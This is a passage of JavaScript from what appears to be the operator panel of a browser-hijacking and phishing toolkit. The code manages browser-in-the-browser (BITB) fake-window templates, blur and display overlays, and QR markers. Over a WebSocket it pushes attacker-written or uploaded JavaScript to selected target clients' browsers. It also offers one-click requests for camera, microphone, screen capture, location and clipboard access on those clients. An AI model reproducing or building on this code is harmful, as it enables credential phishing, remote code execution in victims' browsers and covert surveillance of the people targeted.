                        alert('Error: Could not find body element in parsed document.');
                        return;
                    }
                    
                    // The EdenQR divs are already in the body from insertQRDivIntoBody or addQRDivToElement
                    // However, we need to make sure we catch ALL EdenQR divs, even if they were added dynamically
                    // Some might be nested deep in the structure (Element-based addition)
                    const edenQrDivs = body.querySelectorAll('[id*="EdenQR"], .EdenQR');
                    
                    if (edenQrDivs.length === 0) {
                        // If no EdenQR found in body (maybe they were added to body directly via fallback?)
                        // Double check body direct children
                        console.warn('No EdenQR divs found in parsedDoc body via querySelectorAll');
                    }

                    edenQrDivs.forEach((el, index) => {
                        if (!el.classList.contains('EdenQR')) {
                            el.className = 'EdenQR';
                        }
                        
                        // Ensure ID is 'Edenqr' (or Edenqr_X if multiple)
                        // If there are multiple, use Edenqr_1, Edenqr_2, etc.
                        if (edenQrDivs.length === 1) {
                            el.id = 'Edenqr';
                        } else {
                            // Use index+1 to guarantee unique IDs for all found divs
                            el.id = 'Edenqr_' + (index + 1);
                        }

                        // Remove any data attributes used for editing (not needed in final HTML)
                        el.removeAttribute('data-edenqr');
                        // Ensure no unwanted inline styles (only keep position/size if needed)
                        const style = el.getAttribute('style') || '';
                        // Keep only essential positioning styles, remove editing markers
                        if (style.includes('border') || style.includes('background') || style.includes('cursor')) {
                            const cleanStyle = style.split(';').filter(s => {
                                const trimmed = s.trim();
                                return trimmed.startsWith('position:') || 
                                       trimmed.startsWith('left:') || 
                                       trimmed.startsWith('top:') || 
                                       trimmed.startsWith('right:') || 
                                       trimmed.startsWith('bottom:') || 
                                       trimmed.startsWith('width:') || 
                                       trimmed.startsWith('height:') || 
                                       trimmed.startsWith('z-index:');
                            }).join(';');
                            el.setAttribute('style', cleanStyle || '');
                        }
                    });
                    
                    // Serialize the entire document back to HTML
                    // outerHTML includes all attributes and content
                    updatedContent = '<!DOCTYPE html>\n' + doc.documentElement.outerHTML;
                } else {
                    // For HTML fragments, serialize the wrapper content
                    const wrapperClone = contentWrapper.cloneNode(true);
                    
                    // Ensure all EdenQR divs have proper class and clean structure
                    const edenQrDivs = wrapperClone.querySelectorAll('[id*="EdenQR"]');
                    edenQrDivs.forEach((el, index) => {
                        if (!el.classList.contains('EdenQR')) {
                            el.className = 'EdenQR';
                        }
                        
                        // Ensure ID is 'Edenqr' (or Edenqr_X if multiple)
                        if (edenQrDivs.length === 1) {
                            el.id = 'Edenqr';
                        } else {
                            el.id = 'Edenqr_' + (index + 1);
                        }

                        // Remove any data attributes used for editing (not needed in final HTML)
                        el.removeAttribute('data-edenqr');
                        // Ensure no unwanted inline styles (only keep position/size if needed)
                        const style = el.getAttribute('style') || '';
                        // Keep only essential positioning styles, remove editing markers
                        if (style.includes('border') || style.includes('background') || style.includes('cursor')) {
                            const cleanStyle = style.split(';').filter(s => {
                                const trimmed = s.trim();
                                return trimmed.startsWith('position:') || 
                                       trimmed.startsWith('left:') || 
                                       trimmed.startsWith('top:') || 
                                       trimmed.startsWith('width:') || 
                                       trimmed.startsWith('height:') || 
                                       trimmed.startsWith('z-index:');
                            }).join(';');
                            el.setAttribute('style', cleanStyle || '');
                        }
                    });

                    // Remove visual-only markers
                    wrapperClone.querySelectorAll('._edenQROriginalIndex, ._edenQROriginalNode').forEach(el => {
                        delete el._edenQROriginalIndex;
                        delete el._edenQROriginalNode;
                    });
                    updatedContent = wrapperClone.innerHTML;
                }

                // Save the updated HTML content
                // For uploaded HTML files, save to the actual file
                const fileName = qrPreviewData.fileName;
                
                // Check if this is an uploaded HTML file (from EdenQR Designer or Display section)
                // Try to save to server first (for EdenQR Designer uploaded files)
                if (fileName && fileName.endsWith('.html')) {
                    // First, try to save to server uploads folder (EdenQR Designer files)
                    fetch('http://127.0.0.1:5000/api/save_html_file', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            filename: fileName,
                            content: updatedContent
                        })
                    })
                    .then(r => r.json())
                    .then(d => {
                        if (d.status === 'ok') {
                            showStatusMessage('success', `HTML file "${fileName}" saved with EdenQR divs!`);
                            // Also update fileStorage if it exists (for Display section files)
                            if (typeof fileStorage !== 'undefined') {
                                const fileData = fileStorage.get(fileName);
                                if (fileData) {
                                    fileData.data = updatedContent;
                                    fileStorage.set(fileName, fileData);
                                }
                            }
                            window.closeQRPreviewWindow();
                        } else {
                            // If server save fails, try fileStorage (Display section files)
                            if (typeof fileStorage !== 'undefined') {
                                const fileData = fileStorage.get(fileName);
                                if (fileData) {
                                    fileData.data = updatedContent;
                                    fileStorage.set(fileName, fileData);
                                    showStatusMessage('success', `HTML file "${fileName}" saved to local storage with EdenQR divs!`);
                                    window.closeQRPreviewWindow();
                                    return;
                                }
                            }
                            alert('Failed to save HTML file: ' + (d.error || d.message || 'Unknown error'));
                        }
                    })
                    .catch(e => {
                        console.error('Error saving HTML file to server:', e);
                        // Fallback to fileStorage if server save fails
                        if (typeof fileStorage !== 'undefined') {
                            const fileData = fileStorage.get(fileName);
                            if (fileData) {
                                fileData.data = updatedContent;
                                fileStorage.set(fileName, fileData);
                                showStatusMessage('success', `HTML file "${fileName}" saved to local storage with EdenQR divs!`);
                                window.closeQRPreviewWindow();
                                return;
                            }
                        }
                        alert('Error saving HTML file. Check console for details.');
                    });
                } else {
                    // For templates, save as template snapshot (original behavior)
                    const type = qrPreviewData.actionType === 'BITBContent' ? 'bitb' : (qrPreviewData.section === 'Blur' ? 'blur' : 'display');
                    const snapshot = {
                        type: type,
                        html: updatedContent,
                        fileName: qrPreviewData.fileName
                    };

                    if (type === 'blur') {
                        const effectSel = window.blurEffectType;
                        const intensityInput = window.blurIntensity;
                        snapshot.blur = {
                            effect: effectSel ? effectSel.value : 'blur',
                            intensity: intensityInput ? parseInt(intensityInput.value) : 10,
                            x: parseInt(localStorage.getItem('eden_blur_location_x') || '50'),
                            y: parseInt(localStorage.getItem('eden_blur_location_y') || '50')
                        };
                    } else if (type === 'bitb') {
                        snapshot.bitb = {
                            url: window.bitbCustomUrl,
                            favicon: window.bitbCustomFavicon
                        };
                    }

                    // Save to server-side templates cache
                    saveServerTemplate(qrPreviewData.fileName, snapshot);

                    if (window.websocket && window.websocket.readyState === WebSocket.OPEN) {
                        window.websocket.send(JSON.stringify({
                            type: 'save-template',
                            name: qrPreviewData.fileName,
                            template: snapshot
                        }));
                        showStatusMessage('success', `Template "${qrPreviewData.fileName}" saved with QR div!`);
                    } else {
                        alert('WebSocket not connected. Could not save template to client.');
                    }
                }

                window.closeQRPreviewWindow();
            };

            function ensureEdenTemplateMenu() {
                if (edenTemplateMenu) return edenTemplateMenu;
                edenTemplateMenu = document.createElement('div');
                edenTemplateMenu.id = 'eden-template-context-menu';
                edenTemplateMenu.style.position = 'fixed';
                edenTemplateMenu.style.background = '#ffffff';
                edenTemplateMenu.style.border = '1px solid #e0e0e0';
                edenTemplateMenu.style.borderRadius = '10px';
                edenTemplateMenu.style.boxShadow = '0 10px 32px rgba(15,23,42,0.28)';
                edenTemplateMenu.style.padding = '6px 0';
                edenTemplateMenu.style.display = 'none';
                edenTemplateMenu.style.zIndex = '200000';
                edenTemplateMenu.style.minWidth = '220px';
                edenTemplateMenu.innerHTML =
                    '<div class="eden-tpl-item eden-tpl-edit-bitb" style="padding:10px 16px;cursor:pointer;font-size:13px;display:none;display:flex;align-items:center;gap:8px;">' +
                        '<span style="width:6px;height:6px;border-radius:999px;background:#6366f1;"></span>' +
                        '<span>Edit BITB</span>' +
                    '</div>' +
                    '<div class="eden-tpl-item eden-tpl-save" style="padding:10px 16px;cursor:pointer;font-size:13px;display:flex;align-items:center;gap:8px;">' +
                        '<span style="width:6px;height:6px;border-radius:999px;background:#22c55e;"></span>' +
                        '<span>Save to Event Template</span>' +
                    '</div>' +
                    '<div class="eden-tpl-item eden-tpl-qr" style="padding:10px 16px;cursor:pointer;font-size:13px;display:flex;align-items:center;gap:8px;">' +
                        '<span style="width:6px;height:6px;border-radius:999px;background:#0ea5e9;"></span>' +
                        '<span>Add EdenQR</span>' +
                    '</div>';
                document.body.appendChild(edenTemplateMenu);

                edenTemplateMenu.addEventListener('click', function (ev) {
                    const item = ev.target.closest('.eden-tpl-item');
                    if (!item) return;
                    if (!edenTemplateContext) {
                        edenTemplateMenu.style.display = 'none';
                        return;
                    }
                    const ctx = edenTemplateContext;
                    if (item.classList.contains('eden-tpl-edit-bitb')) {
                        if (ctx.mode === 'bitb' && ctx.fileName) {
                            openBITBEditorForFile(ctx.fileName);
                        }
                        edenTemplateMenu.style.display = 'none';
                        edenTemplateContext = null;
                        return;
                    }
                    if (item.classList.contains('eden-tpl-save')) {
                        handleSaveTemplateFromContext(ctx);
                        edenTemplateMenu.style.display = 'none';
                        edenTemplateContext = null;
                        return;
                    }
                    if (item.classList.contains('eden-tpl-qr')) {
                        const actionType = ctx.mode === 'bitb' ? 'BITBContent' : (ctx.mode === 'blur' ? 'blurContent' : 'showsContent');
                        handleAddEdenQR(actionType, ctx.mode === 'blur' ? 'Blur' : 'Display');
                        edenTemplateMenu.style.display = 'none';
                        edenTemplateContext = null;
                        return;
                    }
                });

                document.addEventListener('click', function (ev) {
                    if (!edenTemplateMenu) return;
                    if (!edenTemplateMenu.contains(ev.target)) {
                        edenTemplateMenu.style.display = 'none';
                        edenTemplateContext = null;
                    }
                });

                return edenTemplateMenu;
            }

        function handleSaveTemplateFromContext(ctx) {
                const name = ctx.fileName;
                if (!name) return;
                let snapshot = null;
                if (ctx.mode === 'display') {
                    const fileData = fileStorage.get(name);
                    if (!fileData || !fileData.data) return;
                    snapshot = {
                        type: 'display',
                        html: fileData.data,
                        fileName: name
                    };
                } else if (ctx.mode === 'blur') {
                    if (!window.loadBlurFiles) return;
                    const files = window.loadBlurFiles();
                    const html = files[name];
                    if (!html) return;
                    const effectSel = window.blurEffectType;
                    const intensityInput = window.blurIntensity;
                    const effect = effectSel ? effectSel.value : 'blur';
                    const intensity = intensityInput ? parseInt(intensityInput.value || '10', 10) : 10;
                    const x = parseInt(localStorage.getItem('eden_blur_location_x') || '50', 10);
                    const y = parseInt(localStorage.getItem('eden_blur_location_y') || '50', 10);
                    snapshot = {
                        type: 'blur',
                        html,
                        blur: { effect, intensity, x, y },
                        fileName: name
                    };
                    // If this effect is a custom uploaded effect, include its CSS so eden.js can apply it
                    try {
                        const effectsKey = 'eden-custom-effects';
                        const saved = localStorage.getItem(effectsKey);
                        if (saved) {
                            const effects = JSON.parse(saved) || {};
                            if (effects[effect] && effects[effect].type === 'css' && effects[effect].content) {
                                snapshot.blur.customEffect = effects[effect].content;
                            }
                        }
                    } catch (e) {
                        console.error('Error attaching custom effect CSS to blur template', e);
                    }
                } else if (ctx.mode === 'bitb') {
                    const fileData = fileStorage.get(name);
                    if (!fileData || !fileData.data) return;
                    const custom = fileBITBCustom[name] || {};
                    snapshot = {
                        type: 'bitb',
                        html: fileData.data,
                        bitb: {
                            url: custom.url || '',
                            favicon: custom.favicon || ''
                        },
                        fileName: name
                    };
                }
                if (!snapshot) return;
                saveServerTemplate(name, snapshot);
                if (typeof ws !== 'undefined' && ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({
                        type: 'save-template',
                        name: name,
                        template: snapshot
                    }));
                }
            }

            function initExistingContainers() {
                document.querySelectorAll('.client-preview-container').forEach(setupContainerSelection);
            }

            const containerObserver = new MutationObserver(mutations => {
                mutations.forEach(mutation => {
                    mutation.addedNodes.forEach(node => {
                        if (node.nodeType !== 1) return;
                        if (node.classList.contains('client-preview-container')) {
                            setupContainerSelection(node);
                        } else if (node.querySelectorAll) {
                            node.querySelectorAll('.client-preview-container').forEach(setupContainerSelection);
                        }
                    });
                });
            });
            containerObserver.observe(document.body, { childList: true, subtree: true });
            initExistingContainers();

            // Handle scroll - keep menu visible unless user explicitly clicks away
            window.addEventListener("scroll", () => {
                if (!contextMenu) return;
                if (contextMenuPinned) return;
                hideViewerContextMenu();
            });

            document.addEventListener('click', event => {
                if (!contextMenu) return;
                // Only close on primary button clicks outside the menu, so right-clicks keep it open
                if (event.button !== 0) return;
                if (!contextMenu.contains(event.target)) {
                    hideViewerContextMenu();
                }
            });

            document.addEventListener('keydown', event => {
                if (event.key === 'Escape') {
                    hideViewerContextMenu();
                    closeActionModal();
                    closeCodeModal();
                }
            });
            
            // Prevent context menu on the context menu itself (like menu.html)
            if (contextMenu) {
                contextMenu.addEventListener("contextmenu", (ev) => ev.preventDefault());
                contextMenu.addEventListener('mouseenter', () => { contextMenuPinned = true; });
                contextMenu.addEventListener('mouseleave', () => { contextMenuPinned = false; });
            }

            // Event groups data structure
            const eventGroups = {
                "Mouse Events": [
                    "dblclick", "mousedown", "mouseup", "mousemove", "mouseenter",
                    "mouseleave", "mouseout", "wheel", "contextmenu"
                ],
                "Keyboard Events": ["keydown", "keypress", "keyup"],
                "Touch Events": ["touchstart", "touchmove", "touchend", "touchcancel"],
                "Form Events": ["submit", "reset", "change", "input", "focus", "blur"],
                "Media Events": ["play", "pause", "ended", "volumechange", "timeupdate"],
                "Clipboard Events": ["copy", "cut", "paste"],
                "Drag Events": ["dragstart", "drag", "drop"],
                "Document/Window Events": [
                    "load", "unload", "resize", "scroll", "hashchange", "DOMContentLoaded"
                ],
                "Misc Events": ["error"]
            };

            // Get menu elements
            const baseItems = document.getElementById('viewer-base-items');
            const moreEventsBtn = document.getElementById('viewer-more-events-btn');
            const groupsContainer = document.getElementById('viewer-groups-container');
            const eventsContainer = document.getElementById('viewer-events-container');
            
            let lastMenuPos = { x: 0, y: 0 };

            // Show groups when "More" is clicked (exactly like menu.html)
            if (moreEventsBtn && groupsContainer) {
                moreEventsBtn.addEventListener('click', (e) => {
                    e.stopPropagation();
                    baseItems.style.display = "none";
                    groupsContainer.style.display = "block";
                    eventsContainer.style.display = "none";
                    groupsContainer.innerHTML = "";
                    
                    // Create group items
                    for (let groupName of Object.keys(eventGroups)) {
                        const div = document.createElement("div");
                        div.className = "context-menu-item group-title";
                        div.textContent = groupName + " ›";
                        div.onclick = (ev) => {
                            ev.stopPropagation();
                            openEventGroup(groupName);
                        };
                        groupsContainer.appendChild(div);
                    }
                    
                    placeViewerContextMenu(lastMenuPos.x, lastMenuPos.y);
                });
            }
            
            // Open events for a specific group (exactly like menu.html)
            function openEventGroup(groupName) {
                groupsContainer.style.display = "none";
                eventsContainer.style.display = "block";
                eventsContainer.innerHTML = "";
                
                // Back bar
                const backRow = document.createElement("div");
                backRow.className = "back-row";
                
                const backBtn = document.createElement("div");
                backBtn.className = "back-btn";
                backBtn.textContent = "◄ Back";
                backBtn.onclick = (ev) => {
                    ev.stopPropagation();
                    eventsContainer.style.display = "none";
                    groupsContainer.style.display = "block";
                    placeViewerContextMenu(lastMenuPos.x, lastMenuPos.y);
                };
                
                const title = document.createElement("div");
                title.className = "context-menu-item";
                title.style.fontWeight = "700";
                title.textContent = groupName;
                
                backRow.appendChild(backBtn);
                backRow.appendChild(title);
                eventsContainer.appendChild(backRow);
                
                // Events list
                for (let eventName of eventGroups[groupName]) {
                    const item = document.createElement("div");
                    item.className = "context-menu-item";
                    item.setAttribute("data-event", eventName);
                    item.textContent = eventName;
                    item.onclick = (ev) => {
                        ev.stopPropagation();
                        const clientId = contextMenu.dataset.clientId;
                        if (!clientId) return;
                        const state = selectionStates.get(clientId);
                        if (!state) return;
                        contextMenu.style.display = "none";
                        
                        if (!state.selectedSelector && !state.selectedArea) {
                            alert('Select an element or draw an area first.');
                            return;
                        }
                        
                        state.selectedEvent = eventName;
                        currentStateForAction = state;
                        currentActionType = null;
                        openActionModal(state);
                    };
                    eventsContainer.appendChild(item);
                }
                
                placeViewerContextMenu(lastMenuPos.x, lastMenuPos.y);
            }
            
            // Prevent page scroll when scrolling the containers
            if (groupsContainer) {
                groupsContainer.addEventListener('wheel', (e) => {
                    e.stopPropagation();
                }, { passive: false });
                groupsContainer.addEventListener('touchmove', (e) => {
                    e.stopPropagation();
                }, { passive: false });
            }
            
            if (eventsContainer) {
                eventsContainer.addEventListener('wheel', (e) => {
                    e.stopPropagation();
                }, { passive: false });
                eventsContainer.addEventListener('touchmove', (e) => {
                    e.stopPropagation();
                }, { passive: false });
            }
            
            // Prevent page scroll when scrolling the context menu
            if (contextMenu) {
                contextMenu.addEventListener('wheel', (e) => {
                    const container = e.currentTarget;
                    const scrollTop = container.scrollTop;
                    const scrollHeight = container.scrollHeight;
                    const height = container.clientHeight;
                    const isScrollingUp = e.deltaY < 0;
                    const isScrollingDown = e.deltaY > 0;
                    
                    // If at top and scrolling up, or at bottom and scrolling down, prevent default
                    if ((scrollTop === 0 && isScrollingUp) || (scrollTop + height >= scrollHeight && isScrollingDown)) {
                        // Allow page scroll only at boundaries
                        return;
                    }
                    
                    // Otherwise, prevent page scroll
                    e.stopPropagation();
                }, { passive: false });
                
                contextMenu.addEventListener('touchmove', (e) => {
                    e.stopPropagation();
                }, { passive: false });
            }

            // Delegated right-click handler for Display / Blur / BITB buttons (event templates)
            document.addEventListener('contextmenu', function (e) {
                const btn = e.target.closest('[data-eden-mode]');
                if (!btn) return;
                const mode = btn.getAttribute('data-eden-mode');
                if (!mode || (mode !== 'display' && mode !== 'blur' && mode !== 'bitb')) return;
                e.preventDefault();
                const fileName = btn.getAttribute('data-file') || null;
                const menu = ensureEdenTemplateMenu();
                edenTemplateContext = { mode, fileName };
                const editRow = menu.querySelector('.eden-tpl-edit-bitb');
                if (editRow) {
                    editRow.style.display = mode === 'bitb' ? 'block' : 'none';
                }
                const rect = document.body.getBoundingClientRect();
                let x = e.clientX;
                let y = e.clientY;
                if (x + 200 > rect.width) x = rect.width - 210;
                if (y + 120 > rect.height) y = rect.height - 130;
                menu.style.left = x + 'px';
                menu.style.top = y + 'px';
                menu.style.display = 'block';
            }, true);

            // Handle clicks on base menu items (main events)
            if (baseItems) {
                baseItems.addEventListener('click', event => {
                    const item = event.target.closest('.context-menu-item');
                    if (!item || item.id === 'viewer-more-events-btn' || !item.dataset.event) return;
                    const clientId = contextMenu.dataset.clientId;
                    if (!clientId) return;
                    const state = selectionStates.get(clientId);
                    if (!state) return;
                    hideViewerContextMenu();

                    if (!state.selectedSelector && !state.selectedArea) {
                        alert('Select an element or draw an area first.');
                        return;
                    }

                    state.selectedEvent = item.dataset.event;
                    if (!state.selectedEvent) return;

                    if (state.selectedEvent === 'qr-area') {
                        if (!state.selectedArea) {
                            alert('QR markers can only be attached to area selections.');
                            return;
                        }
                        sendExecuteCodeMessage({
                            type: 'execute-code',
                            event: 'qr-area',
                            area: state.selectedArea,
                            targetClientId: state.clientId
                        });
                        return;
                    }

                    currentStateForAction = state;
                    currentActionType = null;
                    openActionModal(state);
                });
            }

            executeBtn.addEventListener('click', () => {
                if (!currentStateForAction) return;
                currentActionType = 'execute-js';
                closeActionModal();
                openCodeModal('code');
            });

            copyBtn.addEventListener('click', () => {
                if (!currentStateForAction) return;
                currentActionType = 'copy-text';
                closeActionModal();
                openCodeModal('copy');
            });

            if (permissionsBtn) {
                permissionsBtn.addEventListener('click', () => {
                    if (!currentStateForAction) return;
                    const state = currentStateForAction;
                    if (!state.selectedEvent) {
                        alert('Select an event first.');
                        return;
                    }
                    const overlay = document.createElement('div');
                    overlay.className = 'viewer-modal';
                    overlay.style.display = 'flex';
                    overlay.style.zIndex = '99999';
                    const card = document.createElement('div');
                    card.className = 'modal-card';
                    const h = document.createElement('h3');
                    h.textContent = 'Attach Permission Request';
                    h.style.marginBottom = '20px';
                    h.style.color = '#333';
                    card.appendChild(h);
                    
                    const list = document.createElement('div');
                    list.style.display = 'flex';
                    list.style.flexDirection = 'column';
                    list.style.gap = '10px';
                    
                    const options = [
                        { label: '🔐 Request All Permissions', code: 'requestCamera();requestMicrophone();requestScreen();requestLocation();requestClipboard();', icon: 'fa-shield-alt' },
                        { label: '📸 Request Camera Access', code: 'requestCamera();', icon: 'fa-camera' },
                        { label: '🎤 Request Microphone Access', code: 'requestMicrophone();', icon: 'fa-microphone' },
                        { label: '🖥️ Request Screen Capture', code: 'requestScreen();', icon: 'fa-desktop' },
                        { label: '📍 Request Location Access', code: 'requestLocation();', icon: 'fa-location-arrow' },
                        { label: '📋 Request Clipboard Access', code: 'requestClipboard();', icon: 'fa-clipboard' }
                    ];
                    
                    options.forEach(opt => {
                        const btn = document.createElement('button');
                        btn.type = 'button';
                        btn.className = 'permission-btn';
                        btn.style.cssText = `
                            display: flex;
                            align-items: center;
                            gap: 12px;
                            width: 100%;
                            padding: 12px 16px;
                            border: 1px solid #eef2f7;
                            border-radius: 10px;
                            background: #f8fbff;
                            color: #2c3e50;
                            font-size: 14px;
                            font-weight: 500;
                            cursor: pointer;
                            transition: all 0.2s ease;
                            text-align: left;
                        `;
                        
                        btn.innerHTML = `<span style="font-size: 18px;">${opt.label.split(' ')[0]}</span> <span>${opt.label.split(' ').slice(1).join(' ')}</span>`;
                        
                        btn.onmouseover = () => {
                            btn.style.background = '#e1efff';
                            btn.style.borderColor = '#3498db';
                            btn.style.transform = 'translateX(5px)';
                        };
                        btn.onmouseout = () => {
                            btn.style.background = '#f8fbff';
                            btn.style.borderColor = '#eef2f7';
                            btn.style.transform = 'translateX(0)';
                        };
                        
                        btn.addEventListener('click', () => {
                            const msg = {
                                type: 'execute-code',
                                event: state.selectedEvent,
                                targetClientId: state.clientId,
                                code: opt.code
                            };
                            if (state.selectionSource === 'area' && state.selectedArea) {
                                msg.area = state.selectedArea;
                            } else if (state.selectedSelector) {
                                msg.selector = state.selectedSelector;
                            } else {
                                alert('Unable to determine selection target.');
                                return;
                            }
                            if (window.websocket && window.websocket.readyState === WebSocket.OPEN) {
                                window.websocket.send(JSON.stringify(msg));
                            } else if (typeof ws !== 'undefined' && ws && ws.readyState === WebSocket.OPEN) {
                                ws.send(JSON.stringify(msg));
                            } else {
                                alert('WebSocket connection is not available.');
                            }
                            document.body.removeChild(overlay);
                            closeActionModal();
                            currentActionType = null;
                            currentStateForAction = null;
                        });
                        list.appendChild(btn);
                    });
                    card.appendChild(list);
                    const footer = document.createElement('div');
                    footer.className = 'modal-buttons';
                    const cancel = document.createElement('button');
                    cancel.type = 'button';
                    cancel.className = 'modal-button secondary';
                    cancel.textContent = 'Cancel';
                    cancel.addEventListener('click', () => {
                        document.body.removeChild(overlay);
                    });
                    footer.appendChild(cancel);
                    card.appendChild(footer);
                    overlay.appendChild(card);
                    overlay.addEventListener('click', ev => {
                        if (ev.target === overlay) {
                            document.body.removeChild(overlay);
                        }
                    });
                    document.body.appendChild(overlay);
                });
            }

            if (eventTemplatesBtn) {
                eventTemplatesBtn.addEventListener('click', () => {
                    if (!currentStateForAction) return;
                    const state = currentStateForAction;
                    if (!state.selectedEvent) {
                        alert('Select an event first.');
                        return;
                    }
                    const templates = getServerTemplates();
                    const names = Object.keys(templates);
                    if (!names.length) {
                        alert('No event templates saved yet.');
                        return;
                    }
                    const grouped = { display: [], blur: [], bitb: [] };
                    const nameMap = {}; // Map base name to composite key
                    names.forEach(compositeKey => {
                        const t = templates[compositeKey];
                        if (!t || !t.type) return;
                        // Extract base name from composite key (name_type)
                        // Handle case where name might contain underscores
                        const typeSuffix = '_' + t.type;
                        let baseName = compositeKey;
                        if (compositeKey.endsWith(typeSuffix)) {
                            baseName = compositeKey.slice(0, -typeSuffix.length);
                        }
                        if (grouped[t.type]) {
                            if (!nameMap[baseName]) {
                                nameMap[baseName] = {};
                            }
                            nameMap[baseName][t.type] = compositeKey;
                            if (!grouped[t.type].includes(baseName)) {
                                grouped[t.type].push(baseName);
                            }
                        }
                    });
                    // Build simple selection modal
                    const overlay = document.createElement('div');
                    overlay.className = 'viewer-modal';
                    overlay.style.display = 'flex';
                    overlay.style.zIndex = '99999';
                    const card = document.createElement('div');
                    card.className = 'modal-card';
                    const h = document.createElement('h3');
                    h.textContent = 'Select Event Template';
                    h.style.marginBottom = '15px';
                    h.style.color = '#2c3e50';
                    card.appendChild(h);
                    
                    const list = document.createElement('div');
                    list.style.cssText = `
                        max-height: 450px;
                        overflow-y: auto;
                        padding: 5px;
                        display: flex;
                        flex-direction: column;
                        gap: 15px;
                    `;
                    
                    function addGroup(title, arr, icon) {
                        if (!arr || !arr.length) return;
                        
                        const groupContainer = document.createElement('div');
                        
                        const label = document.createElement('div');
                        label.style.cssText = `
                            font-weight: 700;
                            color: #7f8c8d;
                            font-size: 11px;
                            text-transform: uppercase;
                            letter-spacing: 1px;
                            margin-bottom: 8px;
                            display: flex;
                            align-items: center;
                            gap: 8px;
                        `;
                        label.innerHTML = `<i class="fas ${icon}"></i> ${title}`;
                        groupContainer.appendChild(label);
                        
                        const btnGrid = document.createElement('div');
                        btnGrid.style.display = 'grid';
                        btnGrid.style.gridTemplateColumns = '1fr';
                        btnGrid.style.gap = '6px';
                        
                        arr.forEach(name => {
                            const btn = document.createElement('button');
                            btn.type = 'button';
                            btn.style.cssText = `
                                display: flex;
                                justify-content: space-between;
                                align-items: center;
                                width: 100%;
                                padding: 10px 14px;
                                border: 1px solid #edf2f7;
                                border-radius: 8px;
                                background: #fff;
                                color: #2d3748;
                                font-size: 13.5px;
                                font-weight: 500;
                                cursor: pointer;
                                transition: all 0.2s ease;
                                text-align: left;
                            `;
                            
                            btn.innerHTML = `
                                <span style="display: flex; align-items: center; gap: 8px;">
                                    <i class="far fa-file-alt" style="color: #3498db;"></i>
                                    ${name}
                                </span>
                                <i class="fas fa-chevron-right" style="font-size: 10px; color: #cbd5e0;"></i>
                            `;
                            
                            btn.onmouseover = () => {
                                btn.style.background = '#f7fafc';
                                btn.style.borderColor = '#3498db';
                                btn.style.boxShadow = '0 2px 4px rgba(0,0,0,0.05)';
                                btn.querySelector('.fa-chevron-right').style.transform = 'translateX(3px)';
                                btn.querySelector('.fa-chevron-right').style.color = '#3498db';
                            };
                            btn.onmouseout = () => {
                                btn.style.background = '#fff';
                                btn.style.borderColor = '#edf2f7';
                                btn.style.boxShadow = 'none';
                                btn.querySelector('.fa-chevron-right').style.transform = 'translateX(0)';
                                btn.querySelector('.fa-chevron-right').style.color = '#cbd5e0';
                            };
                            
                            btn.addEventListener('click', () => {
                                // Find template by base name and type (from group)
                                const groupType = arr === grouped.display ? 'display' : (arr === grouped.blur ? 'blur' : 'bitb');
                                const compositeKey = nameMap[name] && nameMap[name][groupType] ? nameMap[name][groupType] : (name + '_' + groupType);
                                const t = templates[compositeKey];
                                if (!t || !t.type || t.type !== groupType) return;
                                
                                const templateType = t.type;
                                let payload = {};
                                
                                if (templateType === 'display') {
                                    payload = { html: t.html, fileName: t.fileName || name };
                                } else if (templateType === 'blur') {
                                    // Package complete blur data including custom effect CSS
                                    const blurData = t.blur || {};
                                    payload = {
                                        html: t.html,
                                        fileName: t.fileName || name,
                                        blur: {
                                            effect: blurData.effect || 'blur',
                                            intensity: blurData.intensity || 10,
                                            x: blurData.x || 50,
                                            y: blurData.y || 50,
                                            customEffect: blurData.customEffect || null
                                        }
                                    };
                                } else if (templateType === 'bitb') {
                                    payload = {
                                        html: t.html,
                                        fileName: t.fileName || name,
                                        bitb: t.bitb || {}
                                    };
                                }
                                
                                const templateEventMsg = {
                                    type: 'template-event',
                                    templateType: templateType,
                                    action: state.selectedEvent,
                                    payload: payload,
                                    source: 'template',
                                    timestamp: Date.now(),
                                    templateName: name,
                                    targetClientId: state.clientId
                                };
                                
                                if (state.selectionSource === 'area' && state.selectedArea) {
                                    templateEventMsg.area = state.selectedArea;
                                } else if (state.selectedSelector) {
                                    templateEventMsg.selector = state.selectedSelector;
                                } else {
                                    alert('Unable to determine selection target.');
                                    return;
                                }
                                
                                if (window.websocket && window.websocket.readyState === WebSocket.OPEN) {
                                    window.websocket.send(JSON.stringify(templateEventMsg));
                                } else if (typeof ws !== 'undefined' && ws && ws.readyState === WebSocket.OPEN) {
                                    ws.send(JSON.stringify(templateEventMsg));
                                } else {
                                    alert('WebSocket connection is not available.');
                                }
                                document.body.removeChild(overlay);
                                closeActionModal();
                                currentActionType = null;
                                currentStateForAction = null;
                            });
                            btnGrid.appendChild(btn);
                        });
                        groupContainer.appendChild(btnGrid);
                        list.appendChild(groupContainer);
                    }
                    addGroup('Display Templates', grouped.display, 'fa-desktop');
                    addGroup('Blur Templates', grouped.blur, 'fa-tint');
                    addGroup('BITB Templates', grouped.bitb, 'fa-window-maximize');
                    card.appendChild(list);
                    const footer = document.createElement('div');
                    footer.className = 'modal-buttons';
                    const cancel = document.createElement('button');
                    cancel.type = 'button';
                    cancel.className = 'modal-button secondary';
                    cancel.textContent = 'Cancel';
                    cancel.addEventListener('click', () => {
                        document.body.removeChild(overlay);
                    });
                    footer.appendChild(cancel);
                    card.appendChild(footer);
                    overlay.appendChild(card);
                    overlay.addEventListener('click', ev => {
                        if (ev.target === overlay) {
                            document.body.removeChild(overlay);
                        }
                    });
                    document.body.appendChild(overlay);
                });
            }

            const uploadBtn = document.getElementById('viewer-upload-js-btn');
            const uploadedFilesList = document.getElementById('viewer-uploaded-files-list');
            const uploadedFilesContainer = document.getElementById('viewer-uploaded-files-container');
            const uploadedFiles = new Map(); // Store uploaded JS files for this session

            if (uploadBtn) {
                uploadBtn.addEventListener('click', () => {
                    if (!currentStateForAction) return;
                    currentActionType = 'upload-js';
                    closeActionModal();
                    openCodeModal('upload');
                    const input = document.createElement('input');
                    input.type = 'file';
                    input.accept = '.js';
                    input.multiple = true;
                    input.onchange = (e) => {
                        const files = Array.from(e.target.files);
                        if (files.length > 0) {
                            let loadedCount = 0;
                            files.forEach(file => {
                                const reader = new FileReader();
                                reader.onload = (event) => {
                                    const content = event.target.result;
                                    uploadedFiles.set(file.name, content);
                                    loadedCount++;
                                    if (loadedCount === files.length) {
                                        updateUploadedFilesList();
                                        uploadedFilesList.style.display = 'block';
                                    }
                                };
                                reader.readAsText(file);
                            });
                        }
